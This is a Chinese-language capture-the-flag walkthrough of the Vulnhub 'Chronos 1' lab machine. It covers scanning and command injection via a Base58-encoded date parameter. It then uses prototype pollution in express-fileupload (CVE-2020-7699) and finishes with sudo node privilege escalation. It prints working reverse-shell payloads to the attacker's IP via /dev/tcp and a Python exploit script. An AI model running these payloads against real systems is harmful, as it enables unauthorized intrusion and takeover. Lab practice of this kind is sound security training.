---
title: Vulnhub-Chronos 1
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# Chronos: 1

> https://www.vulnhub.com/entry/chronos-1,735/
> 

ps：该靶机需要在hosts文件添加`chronos.local`记录，在官方地址上没有写

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`7` ，`kali`是`10`
    
    ```php
    nmap -sP 192.168.56.0/24                       
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 22:44 CST
    Nmap scan report for 192.168.56.1
    Host is up (0.00036s latency).
    MAC Address: 0A:00:27:00:00:13 (Unknown)
    Nmap scan report for 192.168.56.2
    Host is up (0.00042s latency).
    MAC Address: 08:00:27:8B:E9:B0 (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.7
    Host is up (0.00033s latency).
    MAC Address: 08:00:27:B0:C4:F0 (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.10
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.56.7  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 22:44 CST
    Nmap scan report for 192.168.56.7
    Host is up (0.00048s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    8000/tcp open  http-alt
    MAC Address: 08:00:27:B0:C4:F0 (Oracle VirtualBox virtual NIC)
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p 80,22,8000 192.168.56.7
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 22:45 CST
    Nmap scan report for 192.168.56.7
    Host is up (0.00059s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
    8000/tcp open  http    Node.js Express framework
    MAC Address: 08:00:27:B0:C4:F0 (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```python
    nmap -script=vuln -p 80,22,8000 192.168.56.7                                                                                                                                                                   
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 22:45 CST                                                                                                                                                 
    Stats: 0:04:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                                                                         
    NSE Timing: About 98.99% done; ETC: 22:50 (0:00:03 remaining)                                                                                                                                                      
    Stats: 0:07:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                                                                         
    NSE Timing: About 98.99% done; ETC: 22:53 (0:00:05 remaining)                                                                                                                                                      
    Stats: 0:07:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                                                                         
    NSE Timing: About 98.99% done; ETC: 22:53 (0:00:05 remaining)                                                                                                                                                      
    Nmap scan report for 192.168.56.7                                                                                                                                                                                  
    Host is up (0.00057s latency).                                                                      
                                                                                                        
    PORT     STATE SERVICE  
    22/tcp   open  ssh
    80/tcp   open  http     
    |_http-csrf: Couldn't find any CSRF vulnerabilities.                                                     
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                         
    | http-enum:                                                                                        
    |_  /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'   
    |_http-dombased-xss: Couldn't find any DOM based XSS.                               
    8000/tcp open  http-alt                                                                             
    | http-vuln-cve2011-3192:                           
    |   VULNERABLE:                                   
    |   Apache byterange filter DoS                     
    |     State: VULNERABLE                                                                             
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.      
    |     Disclosure date: 2011-08-19                                                                   
    |     References:                                   
    |       https://seclists.org/fulldisclosure/2011/Aug/175                                                 
    |       https://www.securityfocus.com/bid/49303     
    |       https://www.tenable.com/plugins/nessus/55976                                                     
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    | http-slowloris-check:                                                                             
    |   VULNERABLE:                                                                                     
    |   Slowloris DOS attack                                                                            
    |     State: LIKELY VULNERABLE                      
    |     IDs:  CVE:CVE-2007-6750                     
    |       Slowloris tries to keep many connections to the target web server open and hold                  
    |       them open as long as possible.  It accomplishes this by opening connections to              
    |       the target web server and sending a partial request. By doing so, it starves                     
    |       the http server's resources causing Denial Of Service.                         
    |                                                   
    |     Disclosure date: 2009-09-17                                                                   
    |     References:                                   
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                                     
    |_      http://ha.ckers.org/slowloris/              
    MAC Address: 08:00:27:B0:C4:F0 (Oracle VirtualBox virtual NIC)
    ```
    

## web渗透

### 80端口

1. 访问主页
    
    ![image.png](image%2093.png)
    
2. 扫描目录
    
    ```python
    gobuster dir -u http://192.168.56.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,txt | grep -v "403"                                                            
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.56.7
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              php,html,zip,txt
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /index.html           (Status: 200) [Size: 1887]
    /css                  (Status: 301) [Size: 310] [--> http://192.168.56.7/css/]
    Progress: 1102800 / 1102805 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    ```
    
    - `/css` 是存放`css`的文件夹
    
    没找到别的东西
    

### 8000端口

1. 访问主页
    
    ![image.png](image%2094.png)
    
    就是没了样式的`80`端口主页，不过看`80`端口的控制台可以知道，`80`端口是向`8000`端口请求的
    
    ![image.png](image%2095.png)
    
2. 目录扫描
    
    ```python
    obuster dir -u http://192.168.56.7:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,txt | grep -v "403" 
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.56.7:8000
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              php,html,zip,txt
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /date                 (Status: 500) [Size: 1064]
    /Date                 (Status: 500) [Size: 1064]
    Progress: 1102800 / 1102805 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    ```
    
    扫描出`/Date`和`/date` ，两个页面是一样的，返回以下字符
    
    ```python
    TypeError: Expected String
        at decodeUnsafe (/opt/chronos/node_modules/base-x/src/index.js:66:45)
        at Object.decode (/opt/chronos/node_modules/base-x/src/index.js:113:18)
        at /opt/chronos/app.js:25:24
        at Layer.handle [as handle_request] (/opt/chronos/node_modules/express/lib/router/layer.js:95:5)
        at next (/opt/chronos/node_modules/express/lib/router/route.js:137:13)
        at Route.dispatch (/opt/chronos/node_modules/express/lib/router/route.js:112:3)
        at Layer.handle [as handle_request] (/opt/chronos/node_modules/express/lib/router/layer.js:95:5)
        at /opt/chronos/node_modules/express/lib/router/index.js:281:22
        at Function.process_params (/opt/chronos/node_modules/express/lib/router/index.js:335:12)
        at next (/opt/chronos/node_modules/express/lib/router/index.js:275:10)
    ```
    
3. 仔细看上面回显的报错，可以知道是`Node.js` ，以及`express` 一个流行的 `Node.js Web` 框架，可能是一个基于 `Node.js` 和 `Express.js` 的 `Web` 应用（将报错的提示直接喂给chatgpt即可）
    
    下面是GPT的解释：
    
    这个错误 `TypeError: Expected String` 通常是由于某个函数期望传入一个字符串类型的参数，但实际接收到了其他类型的数据（例如 `undefined`、`null` 或对象等）。在你遇到的情况中，问题出现在 `base-x` 包的 `decodeUnsafe` 函数中，这个包是用来进行 base 编码（如 Base64 或 Base58）的编码和解码操作。
    
    ![image.png](image%2096.png)
    
    回到前面，我们注意到了`80`端口也是请求的`8000`端口的`/date` ，参数是`format` ，后面跟着的应该是`Base64` 或 `Base58` ，而我们直接访问`/date`不加参数（`undefined`、`null`）就会造成上面的报错`TypeError`
    
4. 复制`80`端口请求`8000`端口`/date`的包后面的参数进行解码
    
    ```python
    4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
    ```
    
    尝试后可得知是`Base58` ，解码出来是
    
    ```python
    '+Today is %A, %B %d, %Y %H:%M:%S.'
    ```
    
    就是`80`端口上的时间
    
    ![image.png](image%2097.png)
    
5. 我们尝试将其修改为别的字符串，看看能不能修改
    - 将`'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'`通过`base58`编码后得到 `DjerGPjfzgpppwBPtBUY9XHKb6yTharNX81g3tSBJ3hJdABPG8Bj1gnmwWqc`
    - 刷新`80`端口主页，抓包，修改`/date`后的参数为我们修改过
        
        ![image.png](image%2098.png)
        
    - 修改后放行，回到浏览器查看
        
        ![image.png](image%2099.png)
        
        是可以修改的，这里可能是突破点
        
6. 我们将注意力放在`'+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.'` ，将其投喂给`GPT`后发现不是`Node.js`
    
    ```python
    # GPT 原话
    在 Node.js 中，这样的格式化字符串一般不会直接使用像 %A、%B 这样的占位符，
    因为 JavaScript（包括 Node.js）的日期时间处理方式和其他语言（如 Python）有所不同。
    ```
    
    最后得知是`Linux`中的`Date`命令
    
    ![image.png](image%20100.png)
    
    很难不怀疑是命令执行
    
7. 通过使用`Linux`构造命令，然后进行编码尝试是否存在命令执行
    
    ```python
    '+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.' | ls
    ```
    
    会将前面的结果传递给后面的命令作为命令，但是`ls`不接受前面的结果，所以会直接执行`ls`
    
    进行`Base58`编码
    
    ```python
    7LpzQUvtAU8ezh7iNvMhdy7bv2ZW8RaxEkthfeUDjBN2WGYxytPqosuP9BtJfrTBUSn
    ```
    
    然后通过上面抓包的方式将参数进行替换后
    
    ![image.png](image%20101.png)
    
    可以发现将`ls`的结果打印出来了
    

### 尝试获得shell

1. 将参数修改为反弹`shell`的命令（`192.168.56.10`是`kali`）
    
    PS:突然发现较新的靶机都不能直接通过`nc`来反弹`shell`，需要通过`bash`来反弹
    
    ```python
    '+Today is TESTTEST %A, %B %d, %Y %H:%M:%S.' | bash -c "bash -i >& /dev/tcp/192.168.56.10/1234 0>&1"
    ```
    
    编码后得到
    
    ```python
    2XHxFqgRgHdnuw7ymykTgiqjFXsf7ew4NHNWzh32oWPcBSFmAv79MRw4ezcAFwUUe6V4GMCkMRUE7T3Lc6JBiNLaBMPiw9rTgpKdigK4HxoDBDDYcfF7bTLgcaRMj63ozzHBCUA6M
    ```
    
2. `kali`开启监听，然后抓包将参数替换，可以发现已经反弹成功了
    
    ```python
    ┌──(root㉿kali)-[~/Desktop]
    └─# nc -lvp 1234                                
    listening on [any] 1234 ...
    
    connect to [192.168.56.10] from chronos.local [192.168.56.7] 41632
    bash: cannot set terminal process group (808): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@chronos:/opt/chronos$ 
    www-data@chronos:/opt/chronos$ 
    ```
    

## 提权

1. 查看权限
    
    ```python
    www-data@chronos:/opt/chronos$ whoami
    www-data
    www-data@chronos:/opt/chronos$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@chronos:/opt/chronos$ uname -a
    Linux chronos 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
    ```
    
2. 寻找突破点
    - `SUID`，无可利用
    - `/opt/`下存在`chronos-v2`文件夹（靶机下存在这些文件夹，大概是突破口了），查看其后端文件夹`/opt/chronos-v2/backend`
        
        存在`server.js` 
        
        ```python
        # server.js 
        const express = require('express');
        const fileupload = require("express-fileupload");
        const http = require('http')
        
        const app = express();
        
        app.use(fileupload({ parseNested: true }));
        
        app.set('view engine', 'ejs');
        app.set('views', "/opt/chronos-v2/frontend/pages");
        
        app.get('/', (req, res) => {
           res.render('index')
        });
        
        const server = http.Server(app);
        const addr = "127.0.0.1"
        const port = 8080;
        server.listen(port, addr, () => {
           console.log('Server listening on ' + addr + ' port ' + port);
        });
        www-data@chronos:/opt/chronos-v2/backend$ 
        ```
        
        可以看到 `express-fileupload` 存在文件上传，并开启在`8080`端口，因为`const addr = "127.0.0.1"` 为本地环回地址，所以只能在本机上访问到，怪不得扫描不到
        
3. 重点是`express-fileupload` ，网上查阅其漏洞
    - 可以在`package.json` 下找到它的版本号`1.1.7-alpha.3`
        
        ```python
        cat package.json
        {
          "name": "some-website",
          "version": "1.0.0",
          "description": "",
          "main": "server.js",
          "scripts": {
            "start": "node server.js"
          },
          "author": "",
          "license": "ISC",
          "dependencies": {
            "ejs": "^3.1.5",
            "express": "^4.17.1",
            "express-fileupload": "^1.1.7-alpha.3"
          }
        }
        ```
        
    - **`CVE-2020-7699` 找到漏洞RCE**
        
        > https://www.freebuf.com/vuls/246029.html
        > 
        
        > https://www.freebuf.com/articles/web/322857.html
        > 
        
        > https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/
        > 
        
        本菜鸡没看懂，要学习`Node.js`污染原型链，本菜鸡没学过，大概知道要怎么利用
        
        大概就是将数据包里的的`name`改为
        
        ```
        __proto__.outputFunctionName
        ```
        
        然后将值改为：
        
        ```
        x;process.mainModule.require('child_process').exec('bash -c "bash -i &> /dev/tcp/ip/prot 0>&1"');x
        ```
        
        当我们再次发起请求时，便会在指定的主机反弹回来一个`shell`，从而达到RCE的目的
        
        其实在上面的链接也给出了利用脚本
        
        ```python
        import requests
        
        cmd = 'bash -c "bash -i &> /dev/tcp/192.168.56.10/8888 0>&1"'
        
        # pollute
        requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
            None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
        
        # execute command
        requests.get('http://127.0.0.1:8080')
        ```
        
        我们将脚本改名为`shell.py`然后上传到靶机进行利用
        
    - 存放在靶机的`/tmp`目录里，同时`kali`监听`8888`端口，执行脚本（使用`python3`执行）
        
        可以看到已经反弹到`8888`端口了
        
        ![image.png](image%20102.png)
        
        用户是`imera`
        
4. 在该用户家目录下存在`flag`文件
    
    ```python
    imera@chronos:~$ cat user.txt
    byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK
    ```
    
5. 查看权限
    
    ```python
    imera@chronos:/opt/chronos-v2/backend$ sudo -l
    sudo -l
    Matching Defaults entries for imera on chronos:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User imera may run the following commands on chronos:
        (ALL) NOPASSWD: /usr/local/bin/npm *
        (ALL) NOPASSWD: /usr/local/bin/node *
    ```
    
6. 可以进行提权了
    
    > https://www.huangmj.com/17116743651246.html#41-sudo-node
    > 
    
    ```python
    imera@chronos:~$ sudo node -e "require('child_process').spawn('/bin/bash',{stdio:[0,1,2]})"
    id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    
    获得root！！！！
    
7. 读取`flag` 文件
    
    ```python
    # user.txt
    byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK
    ```
    

## 总结

难点在提权到`imera`用户，以及发现`web`突破点的思路，还得学习Node.js的原型链污染（我还没学），最后的提权到`root`也是之前没有尝试过的